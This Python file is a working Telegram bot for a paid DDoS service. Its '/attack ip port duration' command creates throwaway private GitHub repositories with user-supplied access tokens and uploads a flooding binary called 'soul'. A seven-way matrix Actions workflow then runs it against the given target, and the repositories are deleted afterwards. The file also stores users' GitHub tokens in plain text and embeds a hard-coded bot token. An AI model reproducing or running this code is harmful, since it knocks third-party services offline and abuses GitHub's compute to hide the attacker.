import os
import json
import time
import random
import string
import base64
import asyncio
import logging
from datetime import datetime, timedelta
from typing import Dict, Any, Optional, List

import requests
import yaml
from telegram import (
    Update,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputFile
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

# ---------------- Configuration ----------------
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8567692455:AAH0FwtfrCD8akjVC0HmmqIS_VblgLJtdow")  # set env or inline
DEVELOPER_TAG = "@DEVILVIPDDOSX"  # will be shown in messages

# Owner and admin control
OWNER_IDS = {7504507405}  # replace with your Telegram user id(s)
ADMINS_FILE = "admins.json"     # {"admins":[...]}
USERS_FILE = "users.json"       # {"user_id":{"expires":"ISOZ"}}
TOKENS_FILE = "tokens.txt"      # lines "userid:token"
TOKENS_STATUS_FILE = "tokens.json"  # token live/dead results

BINARY_NAME = "soul"            # must be uploaded via /file
BINARY_PATH = os.path.join(os.getcwd(), BINARY_NAME)  # saved in working dir
DEFAULT_THREADS_FILE = "threads.json"  # {"threads": 4000}

# Track running attacks per chat (now with list of repos)
ATTACK_STATUS: Dict[int, Dict[str, Any]] = {}

# ---------------- Utilities ----------------
def load_json(path: str, default: Any) -> Any:
    if not os.path.exists(path):
        return default
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return default  # robust fallback

def save_json(path: str, data: Any) -> None:
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)  # persist configs

def set_default_threads(value: int) -> None:
    save_json(DEFAULT_THREADS_FILE, {"threads": int(value)})  # store threads

def get_default_threads() -> int:
    data = load_json(DEFAULT_THREADS_FILE, {"threads": 4000})
    return int(data.get("threads", 4000))  # defaults to 4000

def is_owner(user_id: int) -> bool:
    return user_id in OWNER_IDS  # owner check

def get_admins() -> set:
    data = load_json(ADMINS_FILE, {"admins": []})
    return set(data.get("admins", []))  # load admins

def is_admin(user_id: int) -> bool:
    return is_owner(user_id) or user_id in get_admins()  # admin or owner

def add_admin(user_id: int) -> None:
    data = load_json(ADMINS_FILE, {"admins": []})
    admins = set(data.get("admins", []))
    admins.add(user_id)
    save_json(ADMINS_FILE, {"admins": sorted(list(admins))})  # update admins

def remove_admin(user_id: int) -> None:
    data = load_json(ADMINS_FILE, {"admins": []})
    admins = set(data.get("admins", []))
    admins.discard(user_id)
    save_json(ADMINS_FILE, {"admins": sorted(list(admins))})  # persist

def get_users() -> Dict[str, Dict[str, str]]:
    return load_json(USERS_FILE, {})  # user approvals

def is_user_approved(user_id: int) -> bool:
    users = get_users()
    info = users.get(str(user_id))
    if not info:
        return False
    try:
        expires = datetime.fromisoformat(info["expires"].replace("Z", "+00:00"))
        return datetime.utcnow().astimezone(expires.tzinfo) <= expires
    except Exception:
        return False  # expiry parsing

def add_user(user_id: int, days: int) -> None:
    users = get_users()
    expires = datetime.utcnow() + timedelta(days=int(days))
    users[str(user_id)] = {"expires": expires.replace(microsecond=0).isoformat() + "Z"}
    save_json(USERS_FILE, users)  # approve user

def remove_user(user_id: int) -> None:
    users = get_users()
    users.pop(str(user_id), None)
    save_json(USERS_FILE, users)  # disapprove user

def rand_repo_name(prefix="soul-run") -> str:
    return f"{prefix}-" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))  # random repo

def build_matrix_workflow_yaml(ip: str, port: str, duration: str, threads: int) -> str:
    # 7-session matrix workflow with ./soul ip port duration threads
    wf = {
        "name": "Matrix 7 runs",
        "on": {"workflow_dispatch": {}},
        "jobs": {
            "run-soul": {
                "runs-on": "ubuntu-latest",
                "strategy": {"fail-fast": False, "matrix": {"session": [1, 2, 3, 4, 5, 6, 7]}},
                "steps": [
                    {"name": "Checkout", "uses": "actions/checkout@v4"},
                    {"name": "Make executable", "run": f"chmod 755 {BINARY_NAME}"},
                    {"name": "Run soul", "run": f"./{BINARY_NAME} {ip} {port} {duration} {threads}"}
                ]
            }
        }
    }
    return yaml.safe_dump(wf, sort_keys=False)  # YAML text

def gh_headers(token: str) -> Dict[str, str]:
    return {"Authorization": f"token {token}", "Accept": "application/vnd.github+json"}  # PAT header

def gh_create_repo(token: str, name: str) -> Optional[Dict[str, Any]]:
    r = requests.post(
        "https://api.github.com/user/repos",
        headers=gh_headers(token),
        json={"name": name, "private": True, "auto_init": False},
        timeout=30
    )
    return r.json() if r.status_code in (201, 202) else None  # create repo

def gh_delete_repo(token: str, full_name: str) -> bool:
    r = requests.delete(
        f"https://api.github.com/repos/{full_name}",
        headers=gh_headers(token),
        timeout=30
    )
    return r.status_code == 204  # delete repo

def gh_put_file(token: str, owner: str, repo: str, path: str, content_bytes: bytes, message: str) -> bool:
    # PUT contents with base64
    b64 = base64.b64encode(content_bytes).decode()
    r = requests.put(
        f"https://api.github.com/repos/{owner}/{repo}/contents/{path}",
        headers=gh_headers(token),
        json={"message": message, "content": b64},
        timeout=30
    )
    return r.status_code in (201, 200)  # contents API

def gh_dispatch_workflow(token: str, owner: str, repo: str, workflow_file: str, ref: str = "main") -> bool:
    # POST dispatches
    r = requests.post(
        f"https://api.github.com/repos/{owner}/{repo}/actions/workflows/{workflow_file}/dispatches",
        headers=gh_headers(token),
        json={"ref": ref},
        timeout=30
    )
    return r.status_code in (204, 201)  # workflow_dispatch

def validate_github_token(token: str) -> bool:
    r = requests.get(
        "https://api.github.com/user",
        headers=gh_headers(token),
        timeout=20
    )
    return r.status_code == 200  # token check

def save_token_line(uid: int, token: str) -> None:
    with open(TOKENS_FILE, "a", encoding="utf-8") as f:
        f.write(f"{uid}:{token}\n")  # persist token with proper newline

def load_all_token_lines() -> List[str]:
    if not os.path.exists(TOKENS_FILE):
        return []
    with open(TOKENS_FILE, "r", encoding="utf-8") as f:
        return [ln.strip() for ln in f if ":" in ln]  # load tokens

def set_status(chat_id: int, running: bool, until: Optional[datetime], repos: Optional[List[str]]) -> None:
    ATTACK_STATUS[chat_id] = {"running": running, "until": until, "repos": repos}  # status with list of repos

def get_status(chat_id: int) -> Dict[str, Any]:
    return ATTACK_STATUS.get(chat_id, {"running": False, "until": None, "repos": []})  # status

async def animate_progress(context: ContextTypes.DEFAULT_TYPE, chat_id: int, text: str, frames: List[str], delay: float = 0.4):
    msg = await context.bot.send_message(chat_id=chat_id, text=text)  # initial send
    for fr in frames:
        await asyncio.sleep(delay)
        try:
            await msg.edit_text(fr)  # edit to animate
        except Exception:
            pass
    return msg  # return reference

def anime_gif_url() -> str:
    # Replace with your preferred public anime GIF API integration
    return "https://media.tenor.com/2RoHfo7f0hUAAAAC/anime-wave.gif"  # simple example

# ---------------- Handlers ----------------
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    frames = [
        "▰▱▱▱▱▱▱▱ 12%",
        "▰▰▱▱▱▱▱▱ 25%",
        "▰▰▰▱▱▱▱▱ 37%",
        "▰▰▰▰▱▱▱▱ 50%",
        "▰▰▰▰▰▱▱▱ 62%",
        "▰▰▰▰▰▰▱▱ 75%",
        "▰▰▰▰▰▰▰▱ 87%",
        "▰▰▰▰▰▰▰▰ 100%"
    ]
    msg = await animate_progress(context, chat_id, "Launching…", [f"Loading {f}" for f in frames], 0.35)  # animation
    welcome = f"Welcome! Use this bot to orchestrate ephemeral GitHub Actions runs.\nDeveloper: {DEVELOPER_TAG}"  # welcome
    try:
        await msg.edit_text(welcome)  # swap into welcome
    except Exception:
        await context.bot.send_message(chat_id=chat_id, text=welcome)  # fallback
    try:
        await context.bot.send_animation(chat_id=chat_id, animation=anime_gif_url(), caption="Menu ready.")  # anime
    except Exception:
        pass  # ignore if GIF fails

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_admin(user_id):
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("Admin panel", callback_data="admin_panel")]])  # inline
        text = (
            "Commands:\n"
            "/start, /help, /ping, /status\n"
            "/settoken - send GitHub PAT (text or .txt)\n"
            "/attack ip port duration - approved only\n"
            "/users, /check, /add userid days, /remove userid\n"
            "/threads N, /file (upload 'soul')\n"
            "Owner: /addadmin userid, /removeadmin userid"
        )  # list
        await update.message.reply_text(text, reply_markup=kb)  # show admin button
    else:
        text = (
            "Commands:\n"
            "/start, /help, /ping, /status\n"
            "/settoken - send GitHub PAT (text or .txt)\n"
            "/attack ip port duration - approved only"
        )  # user commands
        await update.message.reply_text(text)  # send
    try:
        await context.bot.send_animation(chat_id=update.effective_chat.id, animation=anime_gif_url(), caption="Your menu.")  # anime
    except Exception:
        pass  # optional

async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()  # acknowledge
    if q.data == "admin_panel":
        await q.edit_message_text(
            "Admin Panel:\n"
            "/add userid days, /remove userid\n"
            "/threads N, /file, /users, /check\n"
            "Owner: /addadmin userid, /removeadmin userid"
        )  # admin text

async def cmd_ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    t0 = time.time()  # time start
    msg = await update.message.reply_text("Pinging…")  # initial
    dt = int((time.time() - t0) * 1000)  # elapsed
    try:
        await msg.edit_text(f"Pong: {dt} ms")  # final
    except Exception:
        pass  # safe

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    st = get_status(update.effective_chat.id)  # load status
    if st["running"]:
        endt = st["until"].isoformat() if st["until"] else "unknown"  # show end
        repo_count = len(st["repos"]) if st["repos"] else 0
        await update.message.reply_text(f"{repo_count} attack(s) running. Ends around: {endt}")  # report
    else:
        await update.message.reply_text("No attack running.")  # report

async def cmd_settoken(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    # .txt document
    if update.message.document and update.message.document.file_name.endswith(".txt"):
        file = await update.message.document.get_file()  # fetch
        path = await file.download_to_drive()  # store temp
        cnt = 0
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                tok = line.strip()
                if tok:
                    save_token_line(uid, tok)  # append
                    cnt += 1
        os.remove(path)  # cleanup
        msg = await update.message.reply_text(f"Saved {cnt} token(s). Preparing setup…")  # ack
    else:
        # token(s) as text
        text = update.message.text.replace("/settoken", "").strip() if update.message.text else ""  # parse
        if not text:
            await update.message.reply_text("Send the PAT in one message or upload a .txt (one token per line).")  # hint
            return
        tokens = [t.strip() for t in text.split() if t.strip()]  # split
        for tok in tokens:
            save_token_line(uid, tok)  # save
        msg = await update.message.reply_text(f"Saved {len(tokens)} token(s). Setting up…")  # ack

    # progress animation “setup” after token saved
    frames = ["Creating repo ▰▱▱", "Adding binary ▰▰▱", "Ready ▰▰▰"]
    for fr in frames:
        await asyncio.sleep(0.6)  # delay
        try:
            await msg.edit_text(fr)  # edit
        except Exception:
            pass
    try:
        await msg.edit_text("Setup complete. You can now use /attack ip port duration")  # final
    except Exception:
        pass  # safe

async def cmd_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text(f"You are not authorised. Message your father {DEVELOPER_TAG}")  # gate
        return
    if not os.path.exists(USERS_FILE):
        save_json(USERS_FILE, {})  # ensure file
    await update.message.reply_document(InputFile(USERS_FILE))  # send

async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    msg = await update.message.reply_text("Checking tokens…")  # start
    await asyncio.sleep(0.4)
    try:
        await msg.edit_text("Checking tokens ▰▱▱")  # anim
    except Exception:
        pass

    lines = load_all_token_lines()  # all tokens
    if is_admin(uid):
        results = {}
        for i, line in enumerate(lines, 1):
            u, tok = line.split(":", 1)  # parse
            alive = validate_github_token(tok)  # GET /user
            results.setdefault(u, {})[tok[:10] + "…"] = "live" if alive else "dead"  # record
            if i % 5 == 0:
                try:
                    await msg.edit_text(f"Progress {i}/{len(lines)}")  # progress
                except Exception:
                    pass
        save_json(TOKENS_STATUS_FILE, results)  # persist
        await update.message.reply_document(InputFile(TOKENS_STATUS_FILE))  # send
        try:
            await msg.edit_text("Done.")  # finalize
        except Exception:
            pass
    else:
        # per-user summary
        own = [ln for ln in lines if ln.startswith(f"{uid}:")]  # filter
        live = dead = 0
        rows = []
        for i, line in enumerate(own, 1):
            _, tok = line.split(":", 1)  # token
            ok = validate_github_token(tok)  # check
            if ok:
                live += 1
                rows.append(f"{tok[:12]}…: ✅ live")  # summary
            else:
                dead += 1
                rows.append(f"{tok[:12]}…: ❌ dead")  # summary
            if i % 4 == 0:
                try:
                    await msg.edit_text(f"Progress {i}/{len(own)}")  # progress
                except Exception:
                    pass
        final_text = "Your tokens:\n" + "\n".join(rows) + f"\n\nLive: {live}, Dead: {dead}"  # report
        try:
            await msg.edit_text(final_text)  # finalize
        except Exception:
            await update.message.reply_text(final_text)  # fallback

async def cmd_add(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text(f"You are not authorised. Message your father {DEVELOPER_TAG}")  # gate
        return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /add userid days")  # usage
        return
    try:
        target = int(context.args[0])
        days = int(context.args[1])  # parse
        add_user(target, days)  # persist
        await update.message.reply_text(f"Approved {target} for {days} days.")  # ack
    except ValueError:
        await update.message.reply_text("Invalid userid or days. Both must be integers.")  # error

async def cmd_remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text(f"You are not authorised. Message your father {DEVELOPER_TAG}")  # gate
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /remove userid")  # usage
        return
    try:
        target = int(context.args[0])  # parse
        remove_user(target)  # persist
        await update.message.reply_text(f"Removed {target}.")  # ack
    except ValueError:
        await update.message.reply_text("Invalid userid. Must be an integer.")  # error

async def cmd_addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid):
        await update.message.reply_text(f"You are not authorised. Message your father {DEVELOPER_TAG}")  # owner gate
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /addadmin userid")  # usage
        return
    try:
        target = int(context.args[0])  # parse
        add_admin(target)  # persist
        await update.message.reply_text(f"Added admin {target}.")  # ack
    except ValueError:
        await update.message.reply_text("Invalid userid. Must be an integer.")  # error

async def cmd_removeadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid):
        await update.message.reply_text(f"You are not authorised. Message your father {DEVELOPER_TAG}")  # owner gate
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /removeadmin userid")  # usage
        return
    try:
        target = int(context.args[0])  # parse
        remove_admin(target)  # persist
        await update.message.reply_text(f"Removed admin {target}.")  # ack
    except ValueError:
        await update.message.reply_text("Invalid userid. Must be an integer.")  # error

async def cmd_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text(f"You are not authorised. Message your father {DEVELOPER_TAG}")  # gate
        return
    if not context.args:
        await update.message.reply_text("Usage: /threads 4000")  # usage
        return
    try:
        val = int(context.args[0])  # parse
        set_default_threads(val)   # persist
        await update.message.reply_text(f"Default threads set to {val}.")  # ack
    except ValueError:
        await update.message.reply_text("Invalid number.")  # error

async def cmd_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text(f"You are not authorised. Message your father {DEVELOPER_TAG}")  # gate
        return
    await update.message.reply_text(f"Upload binary named '{BINARY_NAME}' now.")  # prompt

async def on_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc:
        return  # ignore
    # Save 'soul' binary to working directory
    if doc.file_name == BINARY_NAME:
        if os.path.exists(BINARY_PATH):
            os.remove(BINARY_PATH)  # replace if exists
        f = await doc.get_file()  # fetch
        await f.download_to_drive(custom_path=BINARY_PATH)  # save
        await update.message.reply_text(f"Binary '{BINARY_NAME}' saved to script directory.")  # ack
    # .txt tokens handled by /settoken when command used; other files ignored

async def cmd_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    chat_id = update.effective_chat.id
    if not is_user_approved(uid):
        await update.message.reply_text(f"You are not authorised. Message your father {DEVELOPER_TAG}")  # gate
        return
    if len(context.args) != 3:
        await update.message.reply_text("Usage: /attack ip port duration")  # usage
        return
    ip, port, duration = context.args
    try:
        int(port)
        int(duration)  # validate
    except ValueError:
        await update.message.reply_text("Port and duration must be integers.")  # error
        return
    if not os.path.exists(BINARY_PATH):
        await update.message.reply_text(f"Binary '{BINARY_NAME}' not found. Admin must upload via /file.")  # need file
        return

    # Get all valid tokens for the user
    user_tokens = [ln.split(":", 1)[1] for ln in load_all_token_lines() if ln.startswith(f"{uid}:")]
    valid_tokens = [t for t in user_tokens if validate_github_token(t)]
    if not valid_tokens:
        await update.message.reply_text("No valid GitHub tokens found. Use /settoken to add one.")  # error
        return

    msg = await update.message.reply_text(f"Starting attack with {len(valid_tokens)} token(s)…")  # step 1
    threads = get_default_threads()  # read default
    wf_text = build_matrix_workflow_yaml(ip, port, duration, threads).encode()  # build YAML
    repos = []
    failed_tokens = []

    # Process each valid token
    for token in valid_tokens:
        try:
            # Create repository
            await msg.edit_text(f"Creating repository for token {token[:10]}…")  # step 1
            name = rand_repo_name()
            repo_data = gh_create_repo(token, name)  # create repo
            if not repo_data:
                failed_tokens.append(token[:10] + "…")
                continue
            full_name = repo_data["full_name"]
            owner, repo = full_name.split("/", 1)
            repos.append((token, full_name))

            # Upload workflow
            await msg.edit_text(f"Uploading workflow for {full_name}…")  # step 2
            ok_wf = gh_put_file(token, owner, repo, ".github/workflows/run.yml", wf_text, "Add workflow")  # upload
            if not ok_wf:
                failed_tokens.append(token[:10] + "…")
                gh_delete_repo(token, full_name)
                continue

            # Upload binary
            await msg.edit_text(f"Uploading binary for {full_name}…")  # step 3
            with open(BINARY_PATH, "rb") as bf:
                soul_bytes = bf.read()  # read local
            ok_bin = gh_put_file(token, owner, repo, BINARY_NAME, soul_bytes, "Add binary")  # upload
            if not ok_bin:
                failed_tokens.append(token[:10] + "…")
                gh_delete_repo(token, full_name)
                continue

            # Dispatch workflow
            await msg.edit_text(f"Dispatching workflow for {full_name}…")  # step 4
            if not gh_dispatch_workflow(token, owner, repo, "run.yml", "main"):  # run
                failed_tokens.append(token[:10] + "…")
                gh_delete_repo(token, full_name)
                continue

        except Exception as e:
            failed_tokens.append(token[:10] + "…")
            await msg.edit_text(f"Error with token {token[:10]}…: {str(e)}")
            continue

    if not repos:
        await msg.edit_text(f"Failed to start attack: No successful setups. Failed tokens: {', '.join(failed_tokens) or 'None'}")
        return

    # Mark running status
    until = datetime.utcnow() + timedelta(seconds=int(duration) + 15)  # buffer
    set_status(chat_id, True, until, [r[1] for r in repos])  # state with list of repos
    started = f"Attack started on {ip}:{port} for {duration}s with {len(repos)} token(s) by destroyer sir 💀"
    try:
        await msg.edit_text(started)  # notify
    except Exception:
        await update.message.reply_text(started)  # fallback

    # Progress updates during duration
    total = int(duration)
    ticks = max(1, total // 5)
    for i in range(1, 6):
        await asyncio.sleep(ticks)  # interval
        try:
            await msg.edit_text(f"Running… {ip}:{port} ~{i * 20}% ({len(repos)} repos)")  # progress
        except Exception:
            pass

    # Finished
    try:
        await msg.edit_text(f"Attack finished. Used {len(repos)} token(s). Failed: {', '.join(failed_tokens) or 'None'}")  # end
    except Exception:
        await update.message.reply_text(f"Attack finished. Used {len(repos)} token(s). Failed: {', '.join(failed_tokens) or 'None'}")  # fallback

    # Cleanup repos
    for token, full_name in repos:
        try:
            gh_delete_repo(token, full_name)  # delete
        except Exception:
            pass  # ignore
    set_status(chat_id, False, None, [])  # clear

# ---- Wire application ----
def build_app():
    app = ApplicationBuilder().token(BOT_TOKEN).build()  # PTB v20 app
    app.add_handler(CommandHandler("start", cmd_start))  # /start
    app.add_handler(CommandHandler("help", cmd_help))    # /help
    app.add_handler(CallbackQueryHandler(on_button))     # admin panel
    app.add_handler(CommandHandler("ping", cmd_ping))    # /ping
    app.add_handler(CommandHandler("status", cmd_status))# /status
    app.add_handler(CommandHandler("settoken", cmd_settoken))  # /settoken
    app.add_handler(CommandHandler("attack", cmd_attack))      # /attack
    app.add_handler(CommandHandler("users", cmd_users))        # /users
    app.add_handler(CommandHandler("check", cmd_check))        # /check
    app.add_handler(CommandHandler("add", cmd_add))            # /add
    app.add_handler(CommandHandler("remove", cmd_remove))      # /remove
    app.add_handler(CommandHandler("addadmin", cmd_addadmin))  # /addadmin
    app.add_handler(CommandHandler("removeadmin", cmd_removeadmin))  # /removeadmin
    app.add_handler(CommandHandler("threads", cmd_threads))    # /threads
    app.add_handler(CommandHandler("file", cmd_file))          # /file
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))  # file uploads
    return app  # ready

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)  # logs
    app = build_app()  # init
    app.run_polling()  # polling runner
